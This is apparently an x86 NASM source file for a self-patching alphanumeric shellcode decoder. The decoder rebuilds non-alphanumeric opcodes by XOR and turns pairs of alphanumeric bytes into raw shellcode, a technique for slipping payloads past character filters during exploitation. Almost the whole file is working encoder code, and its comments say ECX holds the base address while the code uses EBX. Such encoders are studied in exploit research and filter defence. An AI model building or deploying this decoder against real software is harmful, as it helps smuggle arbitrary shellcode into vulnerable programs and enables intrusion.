 BITS 32
 
; XOR [ESP], ESI and XOR ESI, [ESP] can be encoded in two ways, one of which is
; alphanumeric. NASM chooses the wrong one, which is why we have these:
%define xor_esp_esi db 0x31, 0x34, 0x64
%define xor_esi_esp db 0x33, 0x34, 0x64

; This code assumes ECX contains the baseaddress of the code. This addres is 
; required to be able to read the encoded shellcode and decode it. Decoding the
; shellcode is done in a loop, which decodes two alphanumeric data bytes into
; one byte of shellcode. The encoded shellcode is stored after the decoder loop.
; The shellcode cannot have null bytes because a null byte is used to mark the 
; end of the shellcode. The shellcode is decoded over the encoded shellcode data
; immediately following the decoder loop. The last byte of the decoder loop is
; a negative offset for the jump that closes the loop. Because no alphanumeric
; bytes have bit 8 set, this byte cannot be alphanumeric. That is why it is 
; encoded along with the shellcode. It is the first byte the decoder decodes
; and it is then immediately uses it to jump back to the start of the loop. Not
; all steps in the decoder loop can be encoded efficiently using alphanmeric 
; bytes. So they have been replaced with alphanumeric bytes that can be XORed
; to produce the desired bytes. Before the decoder loop can be run, these bytes
; are "patched" to create the right instructions to make the decoder work.
start:
; We need to "patch" the decoder loop. ECX points to "start", so we can use that
; to address these bytes. We have to add an offset, but the offsets we want to
; use cannot all be encoded using alphanumeric bytes efficiently. So we will
; create one of them that is not alphanumeric in a register using XOR. Luckely
; we can use this offset as the code to encode the instructions as well, so we
; do not need to add extra code in order to create another value in a register:
	PUSH    BYTE 0x33                   ; [ESP0] = 0x33
	xor_esp_esi ; XOR     [ESP], ESI    ; [ESP0] = 0x33 ^ ESI
	xor_esi_esp ; XOR     ESI,[ESP]     ; ESI = ESI ^ 0x33 ^ ESI = 0x33
	PUSH    BYTE 0x71                   ; [ESP1] = 0x71
	xor_esi_esp ; XOR     ESI,[ESP]     ; ESI = 0x33^0x71
	PUSH    BYTE 0x33^0x71^code         ; [ESP2] = 0x33^0x71^code
	xor_esi_esp ; XOR     ESI,[ESP]     ; ESI = 0x33^0x71 ^ 0x33^0x71^code = code
; Now that ESI contains the code used to make the decoder loop alphanumeric,
; it can be used to patch these bytes. The code can be used as the offset to 
; one of these bytes as well:
	XOR     [EBX+ESI], ESI              ; Fix IMUL opcode
	XOR     [BYTE EBX+inc1], ESI        ; Fix INC opcode
	XOR     [BYTE EBX+data], ESI        ; Fix data
esi_value equ 1
; 
	PUSH    BYTE 0x33                   ; [ESP3] = 0x33
	xor_esp_esi ; XOR     [ESP], ESI    ; [ESP3] = 0x33 ^ ESI
	xor_esi_esp ; XOR     ESI,[ESP]     ; ESI = ESI^0x33 ^ ESI = 0x33
	PUSH    BYTE esi_value^0x33         ; [ESP4] = esi_value^0x33
	xor_esi_esp ; XOR     ESI,[ESP]     ; ESI = 0x33 ^ esi_value^0x33 = esi_value

loop:
imul1:    db 0x6B, 0x44^code, 0x73, offset_esi2, 0x30 ; IMUL    EAX,DWORD PTR DS:[EDX+ESI*2+X],30
  XOR     AH, [BYTE EBX+ESI*2+offset_esi2]
inc1:     db 0x46^code                                ; INC     ESI
  XOR     [BYTE EBX+ESI+offset_esi-1], AH
jnz1:     db 0x75                                     ; JNZ loop (F0)
data:     db 0x70, 0x6A                               ; Encoded offset $-loop

code equ (imul1+1-$$)
offset_esi2 equ ((data-$$) - (esi_value*2))
offset_esi equ ((data-$$) - (esi_value))